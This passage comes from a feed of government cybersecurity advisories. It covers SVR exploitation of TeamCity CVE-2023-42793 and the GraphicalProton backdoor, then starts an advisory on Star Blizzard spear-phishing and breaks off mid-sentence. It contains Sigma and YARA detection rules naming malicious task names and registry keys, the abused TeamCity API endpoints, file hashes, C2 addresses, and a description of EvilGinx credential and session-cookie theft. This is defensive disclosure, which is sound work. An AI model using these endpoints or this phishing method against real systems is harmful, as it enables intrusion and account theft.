'\\Microsoft\\DefenderService'<br />\n\t\t\t          - '\\Microsoft\\Windows\\DefenderUPDService'<br />\n\t\t\t          - '\\Microsoft\\Windows\\WiMSDFS'<br />\n\t\t\t          - '\\Microsoft\\Windows\\Application Experience\\StartupAppTaskCkeck'<br />\n\t\t\t          - '\\Microsoft\\Windows\\Windows Error Reporting\\SubmitReporting'<br />\n\t\t\t          - '\\Microsoft\\Windows\\Windows Defender\\Defender Update Service'<br />\n\t\t\t          - '\\WindowUpdate'<br />\n\t\t\t          - '\\Microsoft\\Windows\\Windows Error Reporting\\CheckReporting'<br />\n\t\t\t          - '\\Microsoft\\Windows\\Application Experience\\StartupAppTaskCheck'<br />\n\t\t\t          - '\\Microsoft\\Windows\\Speech\\SpeechModelInstallTask'<br />\n\t\t\t          - '\\Microsoft\\Windows\\Windows Filtering Platform\\BfeOnServiceStart'<br />\n\t\t\t          - '\\Microsoft\\Windows\\Data Integrity Scan\\Data Integrity Update'<br />\n\t\t\t          - '\\Microsoft\\Windows\\WindowsUpdate\\Scheduled AutoCheck'<br />\n\t\t\t          - '\\Microsoft\\Windows\\ATPUpd'<br />\n\t\t\t          - '\\Microsoft\\Windows\\Windows Defender\\Service Update'<br />\n\t\t\t          - '\\Microsoft\\Windows\\WindowsUpdate\\Scheduled Check'<br />\n\t\t\t          - '\\Microsoft\\Windows\\WindowsUpdate\\Scheduled AutoCheck'<br />\n\t\t\t          - '\\Defender'<br />\n\t\t\t          - '\\defender'<br />\n\t\t\t          - '\\\\Microsoft\\\\Windows\\\\IISUpdateService'<br />\n\t\t\t          - '\\\\Microsoft\\\\Windows\\\\WindowsDefenderService'<br />\n\t\t\t          - '\\\\Microsoft\\\\Windows\\\\WindowsDefenderService2'<br />\n\t\t\t          - '\\\\Microsoft\\\\DefenderService'<br />\n\t\t\t          - '\\\\Microsoft\\\\Windows\\\\DefenderUPDService'<br />\n\t\t\t          - '\\\\Microsoft\\\\Windows\\\\WiMSDFS'<br />\n\t\t\t          - '\\\\Microsoft\\\\Windows\\\\Application Experience\\\\StartupAppTaskCkeck'<br />\n\t\t\t          - '\\\\Microsoft\\\\Windows\\\\Windows Error Reporting\\\\SubmitReporting'<br />\n\t\t\t          - '\\\\Microsoft\\\\Windows\\\\Windows Defender\\\\Defender Update Service'<br />\n\t\t\t          - '\\\\WindowUpdate'<br />\n\t\t\t          - '\\\\Microsoft\\\\Windows\\\\Windows Error Reporting\\\\CheckReporting'<br />\n\t\t\t          - '\\\\Microsoft\\\\Windows\\\\Application Experience\\\\StartupAppTaskCheck'<br />\n\t\t\t          - '\\\\Microsoft\\\\Windows\\\\Speech\\\\SpeechModelInstallTask'<br />\n\t\t\t          - '\\\\Microsoft\\\\Windows\\\\Windows Filtering Platform\\\\BfeOnServiceStart'<br />\n\t\t\t          - '\\\\Microsoft\\\\Windows\\\\Data Integrity Scan\\Data Integrity Update'<br />\n\t\t\t          - '\\\\Microsoft\\\\Windows\\\\WindowsUpdate\\\\Scheduled AutoCheck'<br />\n\t\t\t          - '\\\\Microsoft\\\\Windows\\\\ATPUpd'<br />\n\t\t\t          - '\\\\Microsoft\\\\Windows\\\\Windows Defender\\\\Service Update'<br />\n\t\t\t          - '\\\\Microsoft\\\\Windows\\\\WindowsUpdate\\\\Scheduled Check'<br />\n\t\t\t          - '\\\\Microsoft\\\\Windows\\\\WindowsUpdate\\\\Scheduled AutoCheck'<br />\n\t\t\t          - '\\\\Defender'<br />\n\t\t\t          - '\\\\defender'<br />\n\t\t\t    condition: selection</code></p>\n<p>\n\t\t\t<code>title: Scheduled tasks names used by SVR for GraphicalProton backdoor<br />\n\t\t\tdescription: Hunts for known SVR-specific scheduled task names<br />\n\t\t\tauthor: <br />\n\t\t\treferences:<br />\n\t\t\tdate: 2023/11/15<br />\n\t\t\tlogsource:<br />\n\t\t\t    category: process_creation<br />\n\t\t\t    product: windows<br />\n\t\t\tdetection:<br />\n\t\t\t    selection:<br />\n\t\t\t        Image|endswith:<br />\n\t\t\t          - 'schtasks.exe'<br />\n\t\t\t        CommandLine|contains:<br />\n\t\t\t          - 'IISUpdateService'<br />\n\t\t\t          - 'WindowsDefenderService'<br />\n\t\t\t          - 'WindowsDefenderService2'<br />\n\t\t\t          - 'DefenderService'<br />\n\t\t\t          - 'DefenderUPDService'<br />\n\t\t\t          - 'WiMSDFS'<br />\n\t\t\t          - 'StartupAppTaskCkeck'<br />\n\t\t\t          - 'SubmitReporting'<br />\n\t\t\t          - 'Defender Update Service'<br />\n\t\t\t          - 'WindowUpdate'<br />\n\t\t\t          - 'CheckReporting'<br />\n\t\t\t          - 'StartupAppTaskCheck'<br />\n\t\t\t          - 'SpeechModelInstallTask'<br />\n\t\t\t          - 'BfeOnServiceStart'<br />\n\t\t\t          - 'Data Integrity Update'<br />\n\t\t\t          - 'Scheduled AutoCheck'<br />\n\t\t\t          - 'ATPUpd'<br />\n\t\t\t          - 'Service Update'<br />\n\t\t\t          - 'Scheduled Check'<br />\n\t\t\t          - 'Scheduled AutoCheck'<br />\n\t\t\t          - 'Defender'<br />\n\t\t\t          - 'defender'<br />\n\t\t\t    selection_re:<br />\n\t\t\t        Image|endswith:<br />\n\t\t\t          - 'schtasks.exe'<br />\n\t\t\t        CommandLine|re:<br />\n\t\t\t          - '.*Defender\\sUpdate\\sService.*'<br />\n\t\t\t          - '.*Data\\sIntegrity\\sUpdate.*'<br />\n\t\t\t          - '.*Scheduled\\sAutoCheck.*'<br />\n\t\t\t          - '.*Service\\sUpdate.*'<br />\n\t\t\t          - '.*Scheduled\\sCheck.*'<br />\n\t\t\t          - '.*Scheduled\\sAutoCheck.*'<br />\n\t\t\t    condition: selection or selection_re</code></p>\n<p><code>title: Suspicious registry modifications<br />\n\t\t\tdescription: Suspicious registry modifications<br />\n\t\t\tauthor: <br />\n\t\t\treferences:<br />\n\t\t\tdate: 2023/11/15<br />\n\t\t\tlogsource:<br />\n\t\t\t    category: registry_set<br />\n\t\t\t    product: windows<br />\n\t\t\tdetection:<br />\n\t\t\t    selection:<br />\n\t\t\t        EventID: 4657<br />\n\t\t\t        TargetObject|contains:<br />\n\t\t\t          - 'CurrentControlSet\\\\Control\\\\Lsa\\\\DisableRestrictedAdmin'<br />\n\t\t\t          - 'CurrentControlSet\\\\Control\\\\Lsa\\\\NoLMHash'<br />\n\t\t\t    condition: selection</code></p>\n<p>\n\t\t\t<code>title: Registry modification from cmd<br />\n\t\t\tdescription: Registry modification from cmd<br />\n\t\t\tauthor: <br />\n\t\t\treferences:<br />\n\t\t\tdate: 2023/11/15<br />\n\t\t\tlogsource:<br />\n\t\t\t    category: process_creation<br />\n\t\t\t    product: windows<br />\n\t\t\tdetection:<br />\n\t\t\t    selection:<br />\n\t\t\t        Image|endswith:<br />\n\t\t\t          - 'reg.exe'<br />\n\t\t\t        CommandLine|contains|all:<br />\n\t\t\t          - 'CurrentControlSet'<br />\n\t\t\t          - 'Lsa'<br />\n\t\t\t        CommandLine|contains:<br />\n\t\t\t          - 'DisableRestrictedAdmin'<br />\n\t\t\t          - 'NoLMHash'<br />\n\t\t\t    condition: selection</code></p>\n<p><code>title: Malicious Driver Load<br />\n\t\t\tdescription: Detects the load of known malicious drivers via their names or hash.<br />\n\t\t\treferences:<br />\n\t\t\t    - https://github.com/wavestone-cdt/EDRSandblast#edr-drivers-and-processes-detection<br />\n\t\t\tauthor: <br />\n\t\t\tdate: 2023/11/15<br />\n\t\t\tlogsource:<br />\n\t\t\t    category: driver_load<br />\n\t\t\t    product: windows<br />\n\t\t\tdetection:<br />\n\t\t\t    selection_name:<br />\n\t\t\t        ImageLoaded|endswith:<br />\n\t\t\t            - 'RTCore64.sys'<br />\n\t\t\t            - 'DBUtils_2_3.sys'<br />\n\t\t\t    selection_hash:<br />\n\t\t\t        Hashes|contains:<br />\n\t\t\t            - '01aa278b07b58dc46c84bd0b1b5c8e9ee4e62ea0bf7a695862444af32e87f1fd'<br />\n\t\t\t            - '0296e2ce999e67c76352613a718e11516fe1b0efc3ffdb8918fc999dd76a73a5'<br />\n\t\t\t    condition: selection_name or selection_hash</code></p>\n</td>\n</tr></tbody></table><h4><strong>YARA rules</strong></h4>\n<p>The following rule detects most known GraphicalProton variants.</p>\n<table><tbody><tr><td>\n<p><code>rule APT29_GraphicalProton {<br />\n\t\t\t    strings:<br />\n\t\t\t        // C1 E9 1B                                shr     ecx, 1Bh<br />\n\t\t\t        // 48 8B 44 24 08                          mov     rax, [rsp+30h+var_28]<br />\n\t\t\t        // 8B 50 04                                mov     edx, [rax+4]<br />\n\t\t\t        // C1 E2 05                                shl     edx, 5<br />\n\t\t\t        // 09 D1                                   or      ecx, edx<br />\n\t\t\t        // 48 8B 44 24 08                          mov     rax, [rsp+30h+var_28]<br />\n\t\t\t        $op_string_crypt = { c1 e? (1b | 18 | 10 | 13 | 19 | 10) 48 [4] 8b [2] c1 e? (05 | 08 | 10 | 0d | 07) 09 ?? 48 }</code></p>\n<p><code>        // 48 05 20 00 00 00                       add     rax, 20h ; ' '<br />\n\t\t\t        // 48 89 C1                                mov     rcx, rax<br />\n\t\t\t        // 48 8D 15 0A A6 0D 00                    lea     rdx, unk_14011E546<br />\n\t\t\t        // 41 B8 30 00 00 00                       mov     r8d, 30h ; '0'<br />\n\t\t\t        // E8 69 B5 FE FF                          call    sub_14002F4B0<br />\n\t\t\t        // 48 8B 44 24 30                          mov     rax, [rsp+88h+var_58]<br />\n\t\t\t        // 48 05 40 00 00 00                       add     rax, 40h ; '@'<br />\n\t\t\t        // 48 89 C1                                mov     rcx, rax<br />\n\t\t\t        // 48 8D 15 1B A6 0D 00                    lea     rdx, unk_14011E577<br />\n\t\t\t        // 41 B8 70 01 00 00                       mov     r8d, 170h<br />\n\t\t\t        // E8 49 B5 FE FF                          call    sub_14002F4B0<br />\n\t\t\t        // 48 8B 44 24 30                          mov     rax, [rsp+88h+var_58]<br />\n\t\t\t        // 48 05 60 00 00 00                       add     rax, 60h ; '`'<br />\n\t\t\t        // 48 89 C1                                mov     rcx, rax<br />\n\t\t\t        // 48 8D 15 6C A7 0D 00                    lea     rdx, unk_14011E6E8<br />\n\t\t\t        // 41 B8 2F 00 00 00                       mov     r8d, 2Fh ; '/'<br />\n\t\t\t        // E8 29 B5 FE FF                          call    sub_14002F4B0<br />\n\t\t\t        // 48 8B 44 24 30                          mov     rax, [rsp+88h+var_58]<br />\n\t\t\t        // 48 05 80 00 00 00                       add     rax, 80h<br />\n\t\t\t        // 48 89 C1                                mov     rcx, rax<br />\n\t\t\t        // 48 8D 15 7C A7 0D 00                    lea     rdx, unk_14011E718<br />\n\t\t\t        // 41 B8 2F 00 00 00                       mov     r8d, 2Fh ; '/'<br />\n\t\t\t        // E8 09 B5 FE FF                          call    sub_14002F4B0<br />\n\t\t\t        // 48 8B 44 24 30                          mov     rax, [rsp+88h+var_58]<br />\n\t\t\t        // 48 05 A0 00 00 00                       add     rax, 0A0h<br />\n\t\t\t        $op_decrypt_config = {<br />\n\t\t\t            48 05 20 00 00 00 48 89 C1 48 [6] 41 B8 ?? ?? 00 00 E8 [4] 48 [4]<br />\n\t\t\t            48 05 40 00 00 00 48 89 C1 48 [6] 41 B8 ?? ?? 00 00 E8 [4] 48 [4]<br />\n\t\t\t            48 05 60 00 00 00 48 89 C1 48 [6] 41 B8 ?? ?? 00 00 E8 [4] 48 [4]<br />\n\t\t\t            48 05 80 00 00 00 48 89 C1 48 [6] 41 B8 ?? ?? 00 00 E8 [4] 48 [4]<br />\n\t\t\t            48 05 A0 00 00 00<br />\n\t\t\t        }</code></p>\n<p><code>    condition:<br />\n\t\t\t        all of them<br />\n\t\t\t}</code></p>\n</td>\n</tr></tbody></table><p><strong>Note: </strong>These rules are meant for threat hunting and have not been tested on a larger dataset.</p>\n<h3><strong>MITIGATIONS</strong></h3>\n<p>The FBI, CISA, NSA, SKW, CERT Polska, and NCSC assess the scope and indiscriminate targeting of this campaign poses a threat to public safety and recommend organizations implement the mitigations below to improve organization’s cybersecurity posture. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s <a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals\" title=\"Cross-Sector Cybersecurity Performance Goals\">Cross-Sector Cybersecurity Performance Goals</a> for more information on the CPGs, including additional recommended baseline protections.</p>\n<ul><li><strong>Apply available patches </strong>for CVE-2023-42793 issued by JetBrains TeamCity in mid-September 2023, if not already completed.</li>\n<li><strong>Monitor the network</strong> for evidence of encoded commands and execution of network scanning tools.</li>\n<li><strong>Ensure host-based anti-virus/endpoint monitoring solutions are enabled</strong> and set to alert if monitoring or reporting is disabled, or if communication is lost with a host agent for more than a reasonable amount of time.</li>\n<li><strong>Require use of multi-factor authentication</strong> [<a href=\"https://www.cisa.gov/resources-tools/resources/cpg-report\" title=\"CPG Report\">CPG 1.3</a>] for all services to the extent possible, particularly for email, virtual private networks, and accounts that access critical systems.\n<ul><li>Organizations should adopt multi-factor authentication (MFA) as an additional layer of security for all users with access to sensitive data. Enabling MFA significantly reduces the risk of unauthorized access, even if passwords are compromised.</li>\n</ul></li>\n<li><strong>Keep all operating systems, software, and firmware up to date. </strong>Immediately configure newly-added systems to the network, including those used for testing or development work, to follow the organization’s security baseline and incorporate into enterprise monitoring tools.</li>\n<li><strong>Audit log files</strong> to identify attempts to access privileged certificates and creation of fake identity providers.</li>\n<li><strong>Deploy software to identify suspicious behavior on systems.</strong></li>\n<li><strong>Deploy endpoint protection systems</strong> with the ability to monitor for behavioral indicators of compromise.</li>\n<li><strong>Use available public resources to identify credential abuse with cloud environments.</strong></li>\n<li><strong>Configure authentication mechanisms</strong> to confirm certain user activities on systems, including registering new devices.</li>\n</ul><h3><strong>VALIDATE SECURITY CONTROLS</strong></h3>\n<p>In addition to applying mitigations, FBI, CISA, NSA, SKW, CERT Polska, and NCSC recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&amp;CK for Enterprise framework in this advisory. FBI, CISA, NSA, SKW, CERT Polska, and NCSC recommend testing your existing security controls inventory to assess how they perform against the ATT&amp;CK techniques described in this advisory.</p>\n<p>To get started:</p>\n<ol><li>Select an ATT&amp;CK technique described in this advisory (see previous tables).</li>\n<li>Align your security technologies against the technique.</li>\n<li>Test your technologies against the technique.</li>\n<li>Analyze your detection and prevention technologies’ performance.</li>\n<li>Repeat the process for all security technologies to obtain a set of comprehensive performance data.</li>\n<li>Tune your security program, including people, processes, and technologies, based on the data generated by this process.</li>\n</ol><p>FBI, CISA, NSA, SKW, CERT Polska, and NCSC recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&amp;CK techniques identified in this advisory.</p>\n<h3><strong>REFERENCES</strong></h3>\n<ul><li>FBI, DHS, CISA, Joint Cyber Security Advisory, <a href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-116afile:///C:/Users/hobrien/AppData/Local/Microsoft/Windows/INetCache/Content.Outlook/1W96RGIZ/AA21-116A_Russian_Foreign_Intelligence_Service_Cyber_Operations_508C.pdf\" title=\"Russian Foreign Intelligence Service (SVR) Cyber Operations: Trends and Best Practices for Network Defenders\">Russian Foreign Intelligence Service (SVR) Cyber Operations: Trends and Best Practices for Network Defenders</a></li>\n<li>NSA, CISA, FBI, Joint Cyber Security Advisory<strong>,</strong> <a href=\"https://media.defense.gov/2021/Apr/15/2002621240/-1/-1/0/CSA_SVR_TARGETS_US_ALLIES_UOO13234021.PDF\" title=\"Russian SVR Targets U.S. and Allied Networks\">Russian SVR Targets U.S. and Allied Networks</a></li>\n<li>CISA, <a href=\"https://www.cisa.gov/news-events/news/remediating-networks-affected-solarwinds-and-active-directorym365-compromise\" title=\"Remediating Networks Affected by the Solarwinds and Active Directory/M365 Compromise\">Remediating Networks Affected by the Solarwinds and Active Directory/M365 Compromise</a></li>\n<li>CISA, Alert (AA21-008A), <a href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-008a\" title=\"Detecting Post-Compromise Threat Activity in Microsoft Cloud Environments\">Detecting Post-Compromise Threat Activity in Microsoft Cloud Environments</a></li>\n<li>CISA, Alert (AA20-352A), <a href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-352a\" title=\"Advanced Persistent Threat Compromise of Government Agencies, Critical Infrastructure, and Private Sector Organizations\">Advanced Persistent Threat Compromise of Government Agencies, Critical Infrastructure, and Private Sector Organizations</a></li>\n<li>CISA, CISA Insights, <a href=\"https://www.cisa.gov/sites/default/files/publications/CISA%20Insights%20-%20What%20Every%20Leader%20Needs%20to%20Know%20About%20the%20Ongoing%20APT%20Cyber%20Activity%20-%20FINAL_508.pdf\" title=\"What Every Leader Needs to Know About the Ongoing APT Cyber Activity\">What Every Leader Needs to Know About the Ongoing APT Cyber Activity</a></li>\n<li>FBI, CISA, Joint Cybersecurity Advisory, <a href=\"https://www.cisa.gov/sites/default/files/publications/AA20-336A-APT_Actors_Targeting_US_ThinkTanks.pdf\" title=\"Advanced Persistent Threat Actors Targeting U.S. Think Tanks\">Advanced Persistent Threat Actors Targeting U.S. Think Tanks</a></li>\n<li>CISA, <a href=\"https://www.cisa.gov/news-events/alerts/2020/07/16/malicious-activity-targeting-covid-19-research-vaccine-development\" title=\"Malicious Activity Targeting COVID-19 Research, Vaccine Development\">Malicious Activity Targeting COVID-19 Research, Vaccine Development</a></li>\n<li>NCSC, CSE, NSA, CISA, Advisory: <a href=\"https://media.defense.gov/2020/Jul/16/2002457639/-1/-1/0/NCSC_APT29_ADVISORY-QUAD-OFFICIAL-20200709-1810.PDF\" title=\"APT 29 Targets COVID-19 Vaccine Development\">APT 29 Targets COVID-19 Vaccine Development</a></li>\n</ul><p>The information in this report is being provided “as is” for informational purposes only. FBI, CISA, NSA, SKW, CERT Polska, and NCSC do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by FBI, CISA, NSA, SKW, CERT Polska, and NCSC.</p>\n<h3><strong>VERSION HISTORY</strong></h3>\n<p>December 12, 2023: Initial version.</p>\n<h3><strong>APPENDIX A – INDICATORS OF COMPROMISE CVE-2023-42793</strong></h3>\n<p>On a Windows system, the log file <code>C:\\TeamCity\\logs\\teamcity-server.log</code> will contain a log message when an attacker modified the <code>internal.properties</code> file. There will also be a log message for every process created via the <code>/app/rest/debug/processes</code> endpoint. In addition to showing the command line used, the user ID of the user account whose authentication token was used during the attack is also shown. For example:</p>\n<p><code>[2023-09-26 11:53:46,970]   INFO - ntrollers.FileBrowseController - File edited: C:\\ProgramData\\JetBrains\\TeamCity\\config\\internal.properties by user with id=1<br />\n[2023-09-26 11:53:46,970]   INFO - s.buildServer.ACTIVITIES.AUDIT - server_file_change: File C:\\ProgramData\\JetBrains\\TeamCity\\config\\internal.properties was modified by \"user with id=1\"<br />\n[2023-09-26 11:53:58,227]   INFO - tbrains.buildServer.ACTIVITIES - External process is launched by user user with id=1. Command line: cmd.exe \"/c whoami\"</code></p>\n<p>An attacker may attempt to cover their tracks by wiping this log file. It does not appear that TeamCity logs individual HTTP requests, but if TeamCity is <a href=\"https://www.jetbrains.com/help/teamcity/configuring-proxy-server.html\" title=\"Configuring Proxy Server\">configured to sit behind a HTTP proxy</a>, the HTTP proxy may have suitable logs showing the following target endpoints being accessed:</p>\n<ul><li><code>/app/rest/users/id:1/tokens/RPC2</code> – This endpoint is required to exploit the vulnerability.</li>\n<li><code>/app/rest/users</code> – This endpoint is only required if the attacker wishes to create an arbitrary user.</li>\n<li><code>/app/rest/debug/processes</code> – This endpoint is only required if the attacker wishes to create an arbitrary process.</li>\n</ul><p><strong>Note:</strong> The user ID value may be higher than 1.</p>\n<h3><strong>APPENDIX B – IOCS</strong></h3>\n<h4><em><strong>File IoCs</strong></em></h4>\n<p>GraphicalProton backdoor:</p>\n<ul><li>01B5F7094DE0B2C6F8E28AA9A2DED678C166D615530E595621E692A9C0240732</li>\n<li>34C8F155601A3948DDB0D60B582CFE87DE970D443CC0E05DF48B1A1AD2E42B5E</li>\n<li>620D2BF14FE345EEF618FDD1DAC242B3A0BB65CCB75699FE00F7C671F2C1D869</li>\n<li>773F0102720AF2957859D6930CD09693824D87DB705B3303CEF9EE794375CE13</li>\n<li>7B666B978DBBE7C032CEF19A90993E8E4922B743EE839632BFA6D99314EA6C53</li>\n<li>8AFB71B7CE511B0BCE642F46D6FC5DD79FAD86A58223061B684313966EFEF9C7</li>\n<li>971F0CED6C42DD2B6E3EA3E6C54D0081CF9B06E79A38C2EDE3A2C5228C27A6DC</li>\n<li>CB83E5CB264161C28DE76A44D0EDB450745E773D24BEC5869D85F69633E44DCF</li>\n<li>CD3584D61C2724F927553770924149BB51811742A461146B15B34A26C92CAD43</li>\n<li>EBE231C90FAD02590FC56D5840ACC63B90312B0E2FEE7DA3C7606027ED92600E</li>\n<li>F1B40E6E5A7CBC22F7A0BD34607B13E7E3493B8AAD7431C47F1366F0256E23EB</li>\n<li>C7B01242D2E15C3DA0F45B8ADEC4E6913E534849CDE16A2A6C480045E03FBEE4</li>\n<li>4BF1915785D7C6E0987EB9C15857F7AC67DC365177A1707B14822131D43A6166</li>\n</ul><p>GraphicalProton HTTPS backdoor:</p>\n<ul><li>18101518EAE3EEC6EBE453DE4C4C380160774D7C3ED5C79E1813013AC1BB0B93</li>\n<li>19F1EF66E449CF2A2B0283DBB756850CCA396114286E1485E35E6C672C9C3641</li>\n<li>1E74CF0223D57FD846E171F4A58790280D4593DF1F23132044076560A5455FF8</li>\n<li>219FB90D2E88A2197A9E08B0E7811E2E0BD23D59233287587CCC4642C2CF3D67</li>\n<li>92C7693E82A90D08249EDEAFBCA6533FED81B62E9E056DEC34C24756E0A130A6</li>\n<li>B53E27C79EED8531B1E05827ACE2362603FB9F77F53CEE2E34940D570217CBF7</li>\n<li>C37C109171F32456BBE57B8676CC533091E387E6BA733FBAA01175C43CFB6EBD</li>\n<li>C40A8006A7B1F10B1B42FDD8D6D0F434BE503FB3400FB948AC9AB8DDFA5B78A0</li>\n<li>C832462C15C8041191F190F7A88D25089D57F78E97161C3003D68D0CC2C4BAA3</li>\n<li>F6194121E1540C3553273709127DFA1DAAB96B0ACFAB6E92548BFB4059913C69</li>\n</ul><p>Backdoored vcperf:</p>\n<ul><li>D724728344FCF3812A0664A80270F7B4980B82342449A8C5A2FA510E10600443</li>\n</ul><p>Backdoored Zabbix installation archive:</p>\n<ul><li>4EE70128C70D646C5C2A9A17AD05949CB1FBF1043E9D671998812B2DCE75CF0F</li>\n</ul><p>Backdoored Webroot AV installation archive:</p>\n<ul><li>950ADBAF66AB214DE837E6F1C00921C501746616A882EA8C42F1BAD5F9B6EFF4</li>\n</ul><p>Modified rsockstun</p>\n<ul><li>CB83E5CB264161C28DE76A44D0EDB450745E773D24BEC5869D85F69633E44DCF</li>\n</ul><h4><strong><em>Network IoCs</em></strong></h4>\n<h4><strong><em>Tunnel Endpoints</em></strong></h4>\n<ul><li>65.20.97[.]203</li>\n<li>65.21.51[.]58</li>\n</ul><h4><em><strong>Exploitation Server</strong></em></h4>\n<ul><li>103.76.128[.]34</li>\n</ul><h4><em><strong>GraphicalProton HTTPS C2 URL:</strong></em></h4>\n<p>hxxps://matclick[.]com/wp-query[.]php</p>\n</div>\n","pubDate":"Tue, 12 Dec 2023 12:33:19 EST","dc:creator":"CISA","guid":{"@isPermaLink":"false","#text":"/node/20486"}},{"title":"Russian FSB Cyber Actor Star Blizzard Continues Worldwide Spear-phishing Campaigns","link":"https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-341a","description":"<h4><strong>The Russia-based actor is targeting organizations and individuals in the UK and other geographical areas of interest.</strong></h4>\n<h3><strong>OVERVIEW</strong></h3>\n<p>The Russia-based actor Star Blizzard (formerly known as SEABORGIUM, also known as Callisto Group/TA446/COLDRIVER/TAG-53/BlueCharlie) continues to successfully use spear-phishing attacks against targeted organizations and individuals in the UK, and other geographical areas of interest, for information-gathering activity.</p>\n<p>The UK National Cyber Security Centre (NCSC), the US Cybersecurity and Infrastructure Security Agency (CISA), the US Federal Bureau of Investigation (FBI), the US National Security Agency (NSA), the US Cyber National Mission Force (CNMF), the Australian Signals Directorate’s Australian Cyber Security Centre (ASD’s ACSC), the Canadian Centre for Cyber Security (CCCS), and the New Zealand National Cyber Security Centre (NCSC-NZ) assess that Star Blizzard is almost certainly subordinate to the Russian Federal Security Service (FSB) Centre 18.</p>\n<p>Industry has previously published details of Star Blizzard. This advisory draws on <a href=\"https://www.microsoft.com/en-us/security/blog/2022/08/15/disrupting-seaborgiums-ongoing-phishing-operations/\" title=\"Disrupting SEABORGIUM’s ongoing phishing operations\">that body of information</a>.</p>\n<p>This advisory raises awareness of the spear-phishing techniques Star Blizzard uses to target individuals and organizations. This activity is continuing through 2023.</p>\n<p>To download a PDF version of this advisory, see <a href=\"https://www.ncsc.gov.uk/files/Advisory-Russian-FSB-cyber-actor-star-blizzard-continues-worldwide-spear-sphishing-campaigns.pdf\" title=\"Russian FSB Cyber Actor Star Blizzard Continues Worldwide Spear-phishing Campaigns\">Russian FSB Cyber Actor Star Blizzard Continues Worldwide Spear-phishing Campaigns</a>.</p>\n<h3><strong>TARGETING PROFILE</strong></h3>\n<p>Since 2019, Star Blizzard has targeted sectors including academia, defense, governmental organizations, NGOs, think tanks and politicians.</p>\n<p>Targets in the UK and US appear to have been most affected by Star Blizzard activity, however activity has also been observed against targets in other NATO countries, and countries neighboring Russia.</p>\n<p>During 2022, Star Blizzard activity appeared to expand further, to include defense-industrial targets, as well as US Department of Energy facilities.</p>\n<h3><strong>OUTLINE OF THE ATTACKS</strong></h3>\n<p>The activity is typical of spear-phishing campaigns, where an actor targets a specific individual or group using information known to be of interest to the targets. In a spear-phishing campaign, an actor perceives their target to have direct access to information of interest, be an access vector to another target, or both.</p>\n<h4><strong>Research and Preparation</strong></h4>\n<p>Using open-source resources to conduct reconnaissance, including social media and professional networking platforms, Star Blizzard identifies hooks to engage their target. They take the time to research their interests and identify their real-world social or professional contacts [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1589/\" title=\"Gather Victim Identity Information\">T1589</a>], [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1593/\" title=\"Search Open Websites/Domains\">T1593</a>].</p>\n<p>Star Blizzard creates email accounts impersonating known contacts of their targets to help appear legitimate. They also create fake social media or networking profiles that impersonate respected experts [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1585/001/\" title=\"Establish Accounts: Social Media Accounts\">T1585.001</a>] and have used supposed conference or event invitations as lures.</p>\n<p>Star Blizzard uses webmail addresses from different providers, including Outlook, Gmail, Yahoo and Proton mail in their initial approach [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1585/002/\" title=\"Establish Accounts: Email Accounts\">T1585.002</a>], impersonating known contacts of the target or well-known names in the target’s field of interest or sector.</p>\n<p>To appear authentic, the actor also creates malicious domains resembling legitimate organizations [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1583/001/\" title=\"Acquire Infrastructure: Domains\">T1583.001</a>].</p>\n<p>Microsoft Threat Intelligence Center (MSTIC) provides a list of observed Indicators of Compromise (IOCs) in their SEABORGIUM blog, but this is not exhaustive.</p>\n<h4><strong>Preference for Personal Email Addresses</strong></h4>\n<p>Star Blizzard has predominantly sent spear-phishing emails to targets’ personal email addresses, although they have also used targets’ corporate or business email addresses. The actors may intentionally use personal emails to circumvent security controls in place on corporate networks.</p>\n<h4><strong>Building a Rapport</strong></h4>\n<p>Having taken the time to research their targets’ interests and contacts to create a believable approach, Star Blizzard now starts to build trust. They often begin by establishing benign contact on a topic they hope will engage their targets. There is often some correspondence between attacker and target, sometimes over an extended period, as the attacker builds rapport.</p>\n<h4><strong>Delivery of Malicious Link</strong></h4>\n<p>Once trust is established, the attacker uses typical phishing tradecraft and shares a link [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1566/002/\" title=\"Phishing: Spearphishing Link\">T1566.002</a>], apparently to a document or website of interest. This leads the target to an actor-controlled server, prompting the target to enter account credentials.</p>\n<p>The malicious link may be a URL in an email message, or the actor may embed a link in a document [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1566/001/\" title=\"Phishing: Spearphishing Attachment\">T1566.001</a>] on <a href=\"https://blog.google/threat-analysis-group/continued-cyber-activity-in-eastern-europe-observed-by-tag/\" title=\"Continued cyber activity in Eastern Europe observed by TAG\">OneDrive, Google Drive, or other file-sharing platforms</a>.</p>\n<p>Star Blizzard uses the open-source framework EvilGinx in their spear- phishing activity, which allows them to harvest credentials and session cookies to successfully bypass the use of two-factor authentication [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1539/\" title=\"Steal Web Session Cookie\">T1539</a>], [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1550/004/\" title=\"Use Alternate Authentication Material: Web Session Cookie\">T1550.004</a>].</p>\n<h4><strong>Exploitation and Further Activity</strong></h4>\n<p>Whichever delivery method is used, once the target clicks on the malicious URL, they are directed to an actor-controlled server that mirrors the sign-in page for a legitimate service. Any credentials entered at this point are now compromised.</p>\n<p>Star Blizzard then uses the stolen credentials to log in to a target’s email account [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1078/\" title=\"Valid Accounts\">T1078</a>], where they are known to access and steal emails and attachments from the victim’s inbox [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1114/002/\" title=\"Email Collection: Remote Email Collection\">T1114.002</a>]. They have also set up mail- 